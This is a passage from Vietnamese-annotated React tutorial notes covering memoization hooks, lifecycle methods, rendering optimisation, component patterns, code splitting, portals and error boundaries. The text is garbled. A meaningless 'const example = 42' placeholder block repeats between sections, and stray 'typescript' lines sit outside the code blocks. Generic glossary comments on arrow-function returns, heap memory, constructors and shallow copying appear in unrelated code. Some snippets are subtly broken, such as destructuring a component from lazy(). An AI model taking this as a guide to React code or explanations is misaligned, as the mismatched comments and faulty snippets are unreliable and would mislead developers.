  const sortedProducts = products.sort((a, b) => a.price - b.price);

  // ✅ With useMemo: Chỉ sort khi products hoặc filter thay đổi
  const sortedProducts = useMemo(() => {
    console.log('Sorting...'); // Chú giải: Chỉ log khi re-compute
    return products
      .filter(p => p.category === filter)
      .sort((a, b) => a.price - b.price);
  }, [products, filter]); // Chú giải: Dependencies

  return (
    <ul>
      {sortedProducts.map(p => <li key={p.id}>{p.name}</li>)}
    </ul>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: EXPENSIVE COMPUTATION
 // Chú giải: ══════════════════════════════════════════════════════════

function Fibonacci({ n }) {
  const result = useMemo(() => {
    function fib(num) {
      if (num <= 1) return num;
      return fib(num - 1) + fib(num - 2);
    }
    return fib(n);
  }, [n]);

  return <div>Fibonacci({n}) = {result}</div>;
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: PREVENT CHILD RE-RENDERS
 // Chú giải: ══════════════════════════════════════════════════════════

function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');

  // ❌ New object mỗi render → Child re-render dù props "giống"
  const config = { theme: 'dark', lang: 'en' };

  // ✅ Stable reference → Child chỉ re-render khi config thực sự đổi
  const config = useMemo(() => ({
    theme: 'dark',
    lang: 'en'
  }), []); // Chú giải: No deps = never re-create

  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child config={config} /> {/* Không re-render khi name thay đổi */}
    </>
  );
}

const Child = React.memo(({ config }) => {
  console.log('Child rendered');
  return <div>{config.theme}</div>;
});

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: DERIVED STATE
 // Chú giải: ══════════════════════════════════════════════════════════

function TodoList({ todos }) {
  // Stats chỉ re-compute khi todos thay đổi
  const stats = useMemo(() => ({
    total: todos.length,
    completed: todos.filter(t => t.done).length,
    active: todos.filter(t => !t.done).length,
    completionRate: todos.length > 0
      ? (todos.filter(t => t.done).length / todos.length * 100).toFixed(1)
      : '0'
  }), [todos]);

  return (
    <div>
      <p>Total: {stats.total}</p>
      <p>Completed: {stats.completed}</p>
      <p>Active: {stats.active}</p>
      <p>Completion: {stats.completionRate}%</p>
    </div>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Heap lưu object và mảng; được runtime quản lý bởi trình thu gom rác.
const doubled = useMemo(() => count * 2, [count]);
 // Chú giải: ✅ Just compute directly
const doubled = count * 2;

// ❌ 2. Primitives (không cần memoize)
const greeting = useMemo(() => 'Hello', []);
 // Chú giải: ✅ Just use constant
const greeting = 'Hello';

 // Chú giải: ❌ 3. Over-optimization (premature optimization)
const data = useMemo(() => transform(props.data), [props.data]);
// ✅ Profile first! Nếu không có performance issue, đừng dùng

// Rule: Chỉ dùng useMemo khi:
// - Có performance issue đo được (React DevTools Profiler)
 // Chú giải: - Computation thực sự expensive (>10ms)
 // Chú giải: - Prevent child re-renders (với React.memo)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: useCallback: Memoize FUNCTION
const memoizedCallback = useCallback(() => {
  doSomething(a, b);
}, [a, b]);

 // Chú giải: Equivalent to:
const memoizedCallback = useMemo(() => {
  return () => doSomething(a, b);
}, [a, b]);

 // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: BASIC USAGE
 // Chú giải: ══════════════════════════════════════════════════════════

function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');

 // Chú giải: ❌ New function mỗi render → Child re-render
  const handleClick = () => {
    console.log('Clicked');
  };

  // ✅ Stable reference → Child không re-render
  const handleClick = useCallback(() => {
    console.log('Clicked');
  }, []); // Chú giải: No deps = never re-create

  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child onClick={handleClick} /> {/* Không re-render khi name đổi */}
    </>
  );
}

const Child = React.memo(({ onClick }) => {
  console.log('Child rendered');
  return <button onClick={onClick}>Click</button>;
});

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: WITH DEPENDENCIES
 // Chú giải: ══════════════════════════════════════════════════════════

function SearchBox() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);

  // Function re-create khi query thay đổi
  const handleSearch = useCallback(async () => {
    const data = await fetch(`/api/search?q=${query}`);
    setResults(await data.json());
  }, [query]); // Chú giải: Dependency: query

 // Chú giải: Debounced version
  const debouncedSearch = useCallback(
    debounce(handleSearch, 300),
    [handleSearch]
  );

  return (
    <div>
      <input
        value={query}
        onChange={e => setQuery(e.target.value)}
      />
      <button onClick={handleSearch}>Search</button>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: EVENT HANDLERS WITH STATE
 // Chú giải: ══════════════════════════════════════════════════════════

function TodoItem({ todo, onToggle, onDelete }) {
  // ❌ Tạo function mới mỗi render (nếu không memo)
  const handleToggle = () => onToggle(todo.id);
  const handleDelete = () => onDelete(todo.id);

  // ✅ Stable references (nếu parent truyền memoized callbacks)
  const handleToggle = useCallback(() => {
    onToggle(todo.id);
  }, [todo.id, onToggle]);

  const handleDelete = useCallback(() => {
    onDelete(todo.id);
  }, [todo.id, onDelete]);

  return (
    <li>
      <input type="checkbox" onChange={handleToggle} />
      {todo.text}
      <button onClick={handleDelete}>Delete</button>
    </li>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: CUSTOM HOOKS
 // Chú giải: ══════════════════════════════════════════════════════════

function useDebounce(callback, delay, deps) {
  const timeoutRef = useRef(null);

  return useCallback((...args) => {
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }

    timeoutRef.current = setTimeout(() => {
      callback(...args);
    }, delay);
  }, [callback, delay, ...deps]);
}

 // Chú giải: Usage
function Search() {
  const [query, setQuery] = useState('');

  const search = useCallback((q) => {
    console.log('Searching for:', q);
  }, []);

  const debouncedSearch = useDebounce(search, 500, []);

  return (
    <input
      value={query}
      onChange={e => {
        setQuery(e.target.value);
        debouncedSearch(e.target.value);
      }}
    />
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ 1. useCallback without React.memo (vô ích)
function Parent() {
  const handleClick = useCallback(() => {}, []); // Vô ích vì Child không memo!
  return <Child onClick={handleClick} />;
}

function Child({ onClick }) { // ❌ Không memo → vẫn re-render
  return <button onClick={onClick}>Click</button>;
}

// ✅ Fix: Dùng React.memo
const Child = React.memo(({ onClick }) => {
  return <button onClick={onClick}>Click</button>;
});

 // Chú giải: ❌ 2. Missing dependencies
const handleClick = useCallback(() => {
  console.log(count); // ❌ count không có trong deps → stale
}, []);

 // Chú giải: ✅ Fix: Include count
const handleClick = useCallback(() => {
  console.log(count);
}, [count]);

 // Chú giải: ❌ 3. Over-optimization
const handleClick = useCallback(() => {
  setCount(c => c + 1);
}, []); // ❌ Không cần thiết nếu không pass cho child

 // Chú giải: ✅ Just use regular function
const handleClick = () => {
  setCount(c => c + 1);
};

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: BASIC PATTERN
 // Chú giải: ══════════════════════════════════════════════════════════

type InputHandle = {
  focus: () => void;
  clear: () => void;
};

const CustomInput = forwardRef<InputHandle, { placeholder?: string }>(
  (props, ref) => {
    const inputRef = useRef<HTMLInputElement>(null);

    // Expose custom methods thay vì DOM node
    useImperativeHandle(ref, () => ({
      focus: () => {
        inputRef.current?.focus();
      },
      clear: () => {
        if (inputRef.current) {
          inputRef.current.value = '';
        }
      }
    }), []); // Deps: re-create methods khi deps thay đổi

    return <input ref={inputRef} placeholder={props.placeholder} />;
  }
);

 // Chú giải: Usage
function Parent() {
  const inputRef = useRef<InputHandle>(null);

  return (
    <>
      <CustomInput ref={inputRef} />
      <button onClick={() => inputRef.current?.focus()}>Focus</button>
      <button onClick={() => inputRef.current?.clear()}>Clear</button>
    </>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: FORM VALIDATION
 // Chú giải: ══════════════════════════════════════════════════════════

type FormHandle = {
  submit: () => void;
  reset: () => void;
  validate: () => boolean;
  getValues: () => Record<string, any>;
};

const Form = forwardRef<FormHandle, { onSubmit: (data: any) => void }>(
  ({ onSubmit }, ref) => {
    const [values, setValues] = useState({});
    const [errors, setErrors] = useState({});

    const validate = useCallback(() => {
 // Chú giải: Validation logic
      const newErrors = {};
      if (!values.email) newErrors.email = 'Required';
      setErrors(newErrors);
      return Object.keys(newErrors).length === 0;
    }, [values]);

    useImperativeHandle(ref, () => ({
      submit: () => {
        if (validate()) {
          onSubmit(values);
        }
      },
      reset: () => {
        setValues({});
        setErrors({});
      },
      validate,
      getValues: () => values
    }), [values, validate, onSubmit]);

    return (
      <form>
        {/* Form fields */}
      </form>
    );
  }
);

 // Chú giải: Usage
function Parent() {
  const formRef = useRef<FormHandle>(null);

  return (
    <>
      <Form ref={formRef} onSubmit={console.log} />
      <button onClick={() => formRef.current?.submit()}>Submit</button>
      <button onClick={() => formRef.current?.reset()}>Reset</button>
    </>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ❌ Don't expose entire DOM node
useImperativeHandle(ref, () => inputRef.current);

 // Chú giải: ✅ Expose specific methods
useImperativeHandle(ref, () => ({
  focus: () => inputRef.current?.focus()
}));

 // Chú giải: ❌ Don't overuse (prefer props/callbacks)
 // Chú giải: Imperative API should be last resort

 // Chú giải: ✅ Use declarative approach when possible
<Input autoFocus onClear={handleClear} /> // Chú giải: Declarative
vs
inputRef.current.focus(); // Chú giải: Imperative

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: BASIC PATTERN
 // Chú giải: ══════════════════════════════════════════════════════════

const store = {
  listeners: new Set(),
  state: { count: 0 },

  subscribe(listener) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  },

  getSnapshot() {
    return this.state;
  },

  increment() {
    this.state = { count: this.state.count + 1 };
    this.listeners.forEach(listener => listener());
  }
};

function Counter() {
  const state = useSyncExternalStore(
    store.subscribe.bind(store), // Chú giải: subscribe function
    store.getSnapshot.bind(store) // Chú giải: getSnapshot function
  );

  return (
    <div>
      <p>Count: {state.count}</p>
      <button onClick={() => store.increment()}>Increment</button>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: BROWSER APIs (window.online)
 // Chú giải: ══════════════════════════════════════════════════════════

function useOnlineStatus() {
  return useSyncExternalStore(
    (callback) => {
      window.addEventListener('online', callback);
      window.addEventListener('offline', callback);
      return () => {
        window.removeEventListener('online', callback);
        window.removeEventListener('offline', callback);
      };
    },
    () => navigator.onLine, // Chú giải: getSnapshot
    () => true // Chú giải: getServerSnapshot (SSR)
  );
}

function StatusBar() {
  const isOnline = useOnlineStatus();
  return <div>{isOnline ? '🟢 Online' : '🔴 Offline'}</div>;
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: WINDOW SIZE
 // Chú giải: ══════════════════════════════════════════════════════════

function useWindowSize() {
  return useSyncExternalStore(
    (callback) => {
      window.addEventListener('resize', callback);
      return () => window.removeEventListener('resize', callback);
    },
    () => ({ width: window.innerWidth, height: window.innerHeight }),
    () => ({ width: 0, height: 0 }) // Chú giải: SSR fallback
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: ZUSTAND STORE (Example)
 // Chú giải: ══════════════════════════════════════════════════════════

const useStore = create((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 }))
}));

 // Chú giải: Zustand internally uses useSyncExternalStore (React 18+)
function Counter() {
  const count = useStore(state => state.count);
  const increment = useStore(state => state.increment);

  return <button onClick={increment}>{count}</button>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
class MyComponent extends React.Component {
 // Chú giải: ══════════════════════════════════════════════════════════
  // MOUNTING PHASE (Component được tạo và thêm vào DOM)
 // Chú giải: ══════════════════════════════════════════════════════════

  constructor(props) {
    super(props);
 // Chú giải: 1. Khởi tạo state
    this.state = { count: 0 };
 // Dùng `bind`, `call`, hoặc `apply` để thiết lập `this` rõ ràng khi cần.
    this.handleClick = this.handleClick.bind(this);
    // ⚠️ KHÔNG gọi setState() ở đây!
    // ⚠️ KHÔNG có side effects (API calls, subscriptions)
  }

  static getDerivedStateFromProps(props, state) {
    // 2. Sync state với props (HIẾM khi dùng)
 // Chú giải: Chạy TRƯỚC mỗi render (mount + update)
 // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
    if (props.value !== state.value) {
      return { value: props.value };
    }
    return null;
  }

  componentDidMount() {
    // 3. Component đã mount vào DOM
 // Chú giải: ✅ PERFECT cho:
 // Chú giải: - API calls / Data fetching
 // Chú giải: - Subscriptions (WebSocket, EventEmitter)
 // Chú giải: - DOM manipulation
 // Chú giải: - Setup timers/intervals

 // Chú giải: Example:
    fetch('/api/data')
      .then(res => res.json())
      .then(data => this.setState({ data }));

    this.timer = setInterval(() => {
      this.setState({ time: new Date() });
    }, 1000);

    document.addEventListener('click', this.handleClick);
  }

 // Chú giải: ══════════════════════════════════════════════════════════
  // UPDATING PHASE (Props hoặc State thay đổi)
 // Chú giải: ══════════════════════════════════════════════════════════

  shouldComponentUpdate(nextProps, nextState) {
    // 4. Quyết định có render lại không (performance optimization)
 // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
    // ⚠️ PureComponent tự động implement shallow comparison

    return nextProps.id !== this.props.id ||
           nextState.count !== this.state.count;
  }

  getSnapshotBeforeUpdate(prevProps, prevState) {
    // 5. Capture DOM info TRƯỚC khi update (HIẾM dùng)
    // Return value → pass vào componentDidUpdate

 // Chú giải: Example: Preserve scroll position
    if (prevProps.list.length < this.props.list.length) {
      return this.listRef.scrollHeight;
    }
    return null;
  }

  componentDidUpdate(prevProps, prevState, snapshot) {
    // 6. Component đã re-render
 // Chú giải: ✅ PERFECT cho:
    // - Fetch data khi props thay đổi
 // Chú giải: - DOM manipulation based on changes
 // Chú giải: - Update third-party libraries

    // ⚠️ MUST so sánh props/state trước khi setState (tránh infinite loop!)
    if (this.props.userId !== prevProps.userId) {
      this.fetchUser(this.props.userId);
    }

 // Chú giải: Use snapshot from getSnapshotBeforeUpdate
    if (snapshot !== null) {
      this.listRef.scrollTop =
        this.listRef.scrollHeight - snapshot;
    }
  }

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: UNMOUNTING PHASE (Component bị remove khỏi DOM)
 // Chú giải: ══════════════════════════════════════════════════════════

  componentWillUnmount() {
 // Chú giải: 7. Cleanup trước khi unmount
    // ✅ REQUIRED để tránh memory leaks:
 // Chú giải: - Clear timers/intervals
 // Chú giải: - Cancel network requests
 // Chú giải: - Unsubscribe
 // Chú giải: - Remove event listeners

    clearInterval(this.timer);
    document.removeEventListener('click', this.handleClick);
    this.subscription.unsubscribe();
  }

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: ERROR HANDLING
 // Chú giải: ══════════════════════════════════════════════════════════

  static getDerivedStateFromError(error) {
    // 8. Update state khi có error
    return { hasError: true };
  }

  componentDidCatch(error, errorInfo) {
 // Chú giải: 9. Log error info
    logErrorToService(error, errorInfo);
  }

  render() {
 // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
    // ⚠️ KHÔNG setState, side effects ở đây!
    return <div>{this.state.count}</div>;
  }
}

```js
// Ví dụ rút gọn
const example = 42;
```

MOUNTING:
constructor → getDerivedStateFromProps → render → componentDidMount

UPDATING (props/state change):
getDerivedStateFromProps → shouldComponentUpdate → render →
getSnapshotBeforeUpdate → componentDidUpdate

UNMOUNTING:
componentWillUnmount

ERROR:
getDerivedStateFromError → componentDidCatch

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
function MyComponent(props) {
 // Chú giải: ══════════════════════════════════════════════════════════
 // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
 // Chú giải: ══════════════════════════════════════════════════════════
  const [count, setCount] = useState(0);
  const [data, setData] = useState(null);

 // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
  const [expensiveState, setExpensiveState] = useState(() => {
    return computeExpensiveValue();
  });

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: EQUIVALENT TO: getDerivedStateFromProps
 // Chú giải: ══════════════════════════════════════════════════════════
  // ❌ Không cần! Chỉ compute trong render
  const derivedValue = props.value * 2;

  // Hoặc nếu cần sync với state:
  const [value, setValue] = useState(props.initialValue);
  useEffect(() => {
    setValue(props.initialValue);
  }, [props.initialValue]);

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: EQUIVALENT TO: componentDidMount
 // Chú giải: ══════════════════════════════════════════════════════════
  useEffect(() => {
 // Chú giải: Chạy SAU first render
    console.log('Mounted');

    fetch('/api/data')
      .then(res => res.json())
      .then(setData);

    const timer = setInterval(() => {}, 1000);

    document.addEventListener('click', handleClick);

 // Chú giải: EQUIVALENT TO: componentWillUnmount
    return () => {
      console.log('Unmounted');
      clearInterval(timer);
      document.removeEventListener('click', handleClick);
    };
  }, []); // Chú giải: Empty deps = chỉ chạy khi mount/unmount

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: EQUIVALENT TO: componentDidUpdate (specific value)
 // Chú giải: ══════════════════════════════════════════════════════════
  useEffect(() => {
    // Chạy khi userId thay đổi
    console.log('userId changed:', props.userId);
    fetchUser(props.userId);
  }, [props.userId]); // Chú giải: Dependency: userId

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: EQUIVALENT TO: componentDidUpdate (every render)
 // Chú giải: ══════════════════════════════════════════════════════════
  useEffect(() => {
 // Chú giải: Chạy SAU mỗi render
    console.log('Component updated');
  }); // Chú giải: No deps = chạy mỗi render

 // Chú giải: Track previous value (like prevProps/prevState)
  const prevCount = usePrevious(count);
  useEffect(() => {
    if (prevCount !== count) {
      console.log(`Count changed from ${prevCount} to ${count}`);
    }
  }, [count, prevCount]);

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: EQUIVALENT TO: shouldComponentUpdate
 // Chú giải: ══════════════════════════════════════════════════════════
  // Dùng React.memo thay vì hook
  // (xem phần React.memo bên dưới)

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: EQUIVALENT TO: getSnapshotBeforeUpdate
 // Chú giải: ══════════════════════════════════════════════════════════
  // Dùng useLayoutEffect (chạy TRƯỚC browser paint)
  useLayoutEffect(() => {
    const snapshot = listRef.current.scrollHeight;
 // Chú giải: Update DOM synchronously
  }, [list]);

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: RENDER
 // Chú giải: ══════════════════════════════════════════════════════════
  return <div>{count}</div>;
}

 // Chú giải: Wrap với React.memo cho shouldComponentUpdate behavior
export default React.memo(MyComponent, (prevProps, nextProps) => {
 // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
  return prevProps.id === nextProps.id;
});

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: 1. Initial render
const vdom = { type: 'div', props: { className: 'box' }, children: ['Hello'] };
 // Chú giải: → React tạo real DOM: <div class="box">Hello</div>

 // Chú giải: 2. State changes
setState({ text: 'World' });

 // Chú giải: 3. New Virtual DOM
const newVdom = { type: 'div', props: { className: 'box' }, children: ['World'] };

 // Chú giải: 4. Diffing algorithm
 // Chú giải: - Same type (div) → keep element, update children
 // Chú giải: - Different type → destroy & re-create
 // Chú giải: - Update: only text node changes

 // Chú giải: 5. Commit phase: Update real DOM
element.textContent = 'World'; // Chỉ update text, không re-create div

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ KHÔNG DÙNG INDEX làm key
{items.map((item, index) => <Item key={index} data={item} />)}
// Problem: Khi thêm/xóa item → index thay đổi → React re-render sai items

// Example: [A, B, C] → Xóa A → [B, C]
// React nghĩ: B có key=0 → giữ nguyên (SAI! B giờ có key=1)
//            C có key=1 → giữ nguyên (SAI! C giờ có key=0)
 // Chú giải: → Input values, scroll position, animations BỊ LOẠN

// ✅ DÙNG STABLE UNIQUE ID
{items.map(item => <Item key={item.id} data={item} />)}
// React biết chính xác item nào added/removed/moved

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
class MyComponent extends React.PureComponent {
  render() {
    return <div>{this.props.name}</div>;
  }
}

 // Chú giải: Equivalent to:
class MyComponent extends React.Component {
  shouldComponentUpdate(nextProps, nextState) {
    return !shallowEqual(this.props, nextProps) ||
           !shallowEqual(this.state, nextState);
  }
}

 // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
// { a: 1 } !== { a: 1 } → re-render (mặc dù giống nhau)
 // Chú giải: [1,2,3] !== [1,2,3] → re-render

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Sao chép nông: chỉ sao chép thuộc tính cấp trên; object lồng bên trong vẫn giữ tham chiếu chung.
const MyComponent = React.memo(({ name, age }) => {
  return <div>{name} - {age}</div>;
});

 // Chú giải: Custom comparison
const MyComponent = React.memo(
  ({ user }) => <div>{user.name}</div>,
  (prevProps, nextProps) => {
    return prevProps.user.id === nextProps.user.id; // Chú giải: true = skip render
  }
);

 // Chú giải: Combine với useMemo/useCallback
function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');

 // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
  const config = useMemo(() => ({ theme: 'dark' }), []);
  const handleClick = useCallback(() => {}, []);

  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child config={config} onClick={handleClick} /> {/* Không re-render */}
    </>
  );
}

const Child = React.memo(({ config, onClick }) => {
  console.log('Child rendered');
  return <button onClick={onClick}>{config.theme}</button>;
});

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Mutable (có thể thay đổi): thuộc tính object hoặc phần tử mảng có thể bị sửa trực tiếp; nếu cần bất biến, dùng `Object.freeze()` (chỉ nông) hoặc pattern/ thư viện bất biến.
const [count, setCount] = useState(0); // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.

 // Chú giải: PROPS: Passed from parent, READ-ONLY
function Child({ count }) { // Chú giải: Cannot modify count
 // Chú giải: count = 10; // ❌ Error!
  return <div>{count}</div>;
}

 // Chú giải: Data flow: Parent state → Child props (one-way)
function Parent() {
  const [count, setCount] = useState(0);
  return <Child count={count} />; // Chú giải: Pass state as props
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ✅ YES: Default behavior
function Parent() {
  const [count, setCount] = useState(0);
  return (
    <>
      <button onClick={() => setCount(count + 1)}>Increment</button>
      <Child /> {/* Re-render ngay cả khi không có props! */}
    </>
  );
}

 // Chú giải: 🔧 Optimization 1: React.memo
const Child = React.memo(() => {
  console.log('Child rendered');
  return <div>Child</div>;
}); // Không re-render nếu props không đổi

 // Chú giải: 🔧 Optimization 2: children prop
function Parent() {
  const [count, setCount] = useState(0);
  return (
    <Layout>
      <Child /> {/* Không re-render! */}
    </Layout>
  );
}

function Layout({ children }) {
  const [theme, setTheme] = useState('light');
  return <div className={theme}>{children}</div>;
  // children là stable reference → không re-create
}

 // Chú giải: 🔧 Optimization 3: Component composition
function Parent() {
  const child = useMemo(() => <Child />, []); // Chú giải: Cache element
  return <div>{child}</div>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
function withLoading(Component) {
  return function WithLoadingComponent({ isLoading, ...props }) {
    if (isLoading) return <div>Loading...</div>;
    return <Component {...props} />;
  };
}

 // Chú giải: Usage
const UserListWithLoading = withLoading(UserList);
<UserListWithLoading isLoading={true} users={[]} />

 // Chú giải: HOC for authentication
function withAuth(Component) {
  return function AuthComponent(props) {
    const { user } = useAuth();
    if (!user) return <Navigate to="/login" />;
    return <Component {...props} user={user} />;
  };
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Component với function as child
function DataFetcher({ url, render }) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch(url).then(res => res.json()).then(data => {
      setData(data);
      setLoading(false);
    });
  }, [url]);

  return render({ data, loading });
}

 // Chú giải: Usage
<DataFetcher
  url="/api/users"
  render={({ data, loading }) => (
    loading ? <Spinner /> : <UserList users={data} />
  )}
/>

 // Chú giải: Modern alternative: Custom hooks
function useDataFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  useEffect(() => { /* fetch logic */ }, [url]);
  return { data, loading };
}

function UserList() {
  const { data, loading } = useDataFetch('/api/users');
  if (loading) return <Spinner />;
  return <ul>{data.map(user => <li key={user.id}>{user.name}</li>)}</ul>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// Components hoạt động cùng nhau qua Context
const TabsContext = createContext();

function Tabs({ children, defaultTab }) {
  const [activeTab, setActiveTab] = useState(defaultTab);
  return (
    <TabsContext.Provider value={{ activeTab, setActiveTab }}>
      {children}
    </TabsContext.Provider>
  );
}

function TabList({ children }) {
  return <div className="tab-list">{children}</div>;
}

function Tab({ id, children }) {
  const { activeTab, setActiveTab } = useContext(TabsContext);
  return (
    <button
      className={activeTab === id ? 'active' : ''}
      onClick={() => setActiveTab(id)}
    >
      {children}
    </button>
  );
}

function TabPanel({ id, children }) {
  const { activeTab } = useContext(TabsContext);
  return activeTab === id ? <div>{children}</div> : null;
}

 // Chú giải: Usage (flexible API)
<Tabs defaultTab="home">
  <TabList>
    <Tab id="home">Home</Tab>
    <Tab id="profile">Profile</Tab>
  </TabList>
  <TabPanel id="home">Home content</TabPanel>
  <TabPanel id="profile">Profile content</TabPanel>
</Tabs>

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: React 17: Chỉ batch trong event handlers
function handleClick() {
  setCount(c => c + 1);
  setFlag(f => !f);
 // Chú giải: → 1 re-render (batched)
}

setTimeout(() => {
  setCount(c => c + 1);
  setFlag(f => !f);
  // → 2 re-renders (KHÔNG batch)
}, 1000);

 // Chú giải: React 18: Automatic batching mọi nơi
setTimeout(() => {
  setCount(c => c + 1);
  setFlag(f => !f);
  // → 1 re-render (batched tự động)
}, 1000);

 // Chú giải: Opt-out batching
import { flushSync } from 'react-dom';

flushSync(() => {
  setCount(c => c + 1);
}); // Chú giải: Render immediately
setFlag(f => !f); // Chú giải: Render again

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Route-based splitting
const Home = lazy(() => import('./Home'));
const About = lazy(() => import('./About'));

function App() {
  return (
    <Suspense fallback={<Spinner />}>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
      </Routes>
    </Suspense>
  );
}

 // Chú giải: Component-based splitting
const HeavyChart = lazy(() => import('./HeavyChart'));

function Dashboard() {
  const [showChart, setShowChart] = useState(false);
  return (
    <>
      <button onClick={() => setShowChart(true)}>Show Chart</button>
      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <HeavyChart />
        </Suspense>
      )}
    </>
  );
}

 // Chú giải: Named exports
const { TabPanel } = lazy(() =>
  import('./Tabs').then(module => ({ default: module.TabPanel }))
);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// Render children vào DOM node khác (ngoài parent hierarchy)
function Modal({ children, isOpen }) {
  if (!isOpen) return null;

  return createPortal(
    <div className="modal-overlay">
      <div className="modal">{children}</div>
    </div>,
    document.getElementById('modal-root') // Chú giải: Target container
  );
}

 // Chú giải: index.html
<body>
  <div id="root"></div>
  <div id="modal-root"></div> <!-- Portal target -->
</body>

 // Chú giải: Use cases:
 // Chú giải: - Modals, Dialogs
 // Chú giải: - Tooltips, Popovers
 // Chú giải: - Notifications (toast)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// Chỉ có thể dùng Class Component (chưa có hook)
class ErrorBoundary extends React.Component {
  state = { hasError: false, error: null };

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return <ErrorFallback error={this.state.error} />;
    }
    return this.props.children;
  }
}

 // Chú giải: Usage
<ErrorBoundary>
  <App />
</ErrorBoundary>

// ⚠️ Error boundaries KHÔNG catch:
// - Event handlers (dùng try/catch)
 // `Promise`: cách biểu diễn giá trị bất đồng bộ; dùng `.then/.catch` hoặc `async/await` để xử lý. `setTimeout`/`setInterval` nằm trong macrotasks; nhớ clear khi không cần để tránh rò rỉ bộ nhớ.
 // Chú giải: - Server-side rendering
 // Chú giải: - Errors trong Error Boundary itself

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Suspense-enabled data fetching
const resource = fetchData('/api/users'); // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).

function UserList() {
  const users = resource.read(); // Chú giải: Suspends if not ready
  return <ul>{users.map(u => <li key={u.id}>{u.name}</li>)}</ul>;
}

function App() {
  return (
    <Suspense fallback={<Spinner />}>
